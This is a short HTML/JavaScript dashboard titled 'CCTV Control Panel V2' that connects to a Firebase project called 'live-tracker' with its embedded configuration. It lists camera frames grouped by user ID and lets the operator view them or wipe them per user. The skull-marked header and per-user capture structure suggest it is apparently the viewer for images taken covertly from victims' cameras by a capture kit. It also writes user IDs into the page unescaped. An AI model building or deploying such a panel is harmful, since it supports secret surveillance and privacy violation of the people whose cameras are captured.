<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CCTV Control Panel V2</title>

<style>
body{
  margin:0;
  font-family:monospace;
  background:#05070f;
  color:#00ff9d;
}

/* HEADER */
header{
  padding:15px;
  text-align:center;
  font-size:18px;
  border-bottom:1px solid #00ff9d33;
  letter-spacing:2px;
}

/* USERS GRID */
.container{
  display:flex;
  flex-direction:column;
  gap:20px;
  padding:15px;
}

/* USER BOX */
.userBox{
  border:1px solid #00ff9d33;
  border-radius:12px;
  padding:12px;
  background:#0b0f1a;
  box-shadow:0 0 12px #00ff9d22;
}

/* TOP BAR */
.topBar{
  display:flex;
  justify-content:space-between;
  align-items:center;
}

/* BUTTONS */
button{
  padding:6px 10px;
  border:1px solid #00ff9d55;
  background:transparent;
  color:#00ff9d;
  cursor:pointer;
  border-radius:6px;
  font-size:12px;
}
button:hover{
  box-shadow:0 0 10px #00ff9d55;
}

/* GRID (COLUMNS) */
.grid{
  margin-top:10px;
  display:grid;
  grid-template-columns:repeat(4, 1fr);
  gap:10px;
  max-height:450px;
  overflow-y:auto;
  padding-right:5px;
}

/* RESPONSIVE */
@media(max-width:900px){
  .grid{grid-template-columns:repeat(3, 1fr);}
}
@media(max-width:600px){
  .grid{grid-template-columns:repeat(2, 1fr);}
}

/* IMAGE */
.grid img{
  width:100%;
  height:120px;
  object-fit:cover;
  border-radius:8px;
  border:1px solid #00ff9d33;
  transition:0.2s;
}

.grid img:hover{
  transform:scale(1.05);
}
</style>
</head>

<body>

<header>💀 CCTV CONTROL PANEL V2</header>

<div class="container" id="grid"></div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>

const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const container = document.getElementById("grid");

/* LOAD USERS */
db.ref("camera").on("value",(snap)=>{

  const data = snap.val();
  container.innerHTML="";

  if(!data){
    container.innerHTML="<p>No Data Found</p>";
    return;
  }

  Object.keys(data).forEach(userId=>{

    const box=document.createElement("div");
    box.className="userBox";

    box.innerHTML=`
      <div class="topBar">
        <h3>👤 ${userId}</h3>
        <button onclick="deleteUser('${userId}')">DELETE ALL</button>
      </div>

      <div class="grid" id="list_${userId}">
        loading...
      </div>
    `;

    container.appendChild(box);

    loadImages(userId);

  });

});

/* LOAD IMAGES GRID */
function loadImages(userId){

  const ref=db.ref("camera/"+userId);

  ref.on("value",(snap)=>{

    const data=snap.val();
    const box=document.getElementById("list_"+userId);

    box.innerHTML="";

    if(!data){
      box.innerHTML="<p>No Images</p>";
      return;
    }

    // latest first
    Object.values(data).reverse().forEach(item=>{

      const img=document.createElement("img");
      img.src=item.frame || "";

      img.onerror=()=>{
        img.src="https://via.placeholder.com/300x200?text=Error";
      };

      box.appendChild(img);

    });

  });

}

/* DELETE USER */
function deleteUser(userId){

  if(confirm("Delete ALL data of "+userId+" ?")){

    db.ref("camera/"+userId).remove()
    .then(()=>alert("Deleted"))
    .catch(err=>alert(err.message));

  }

}

</script>

</body>
</html>
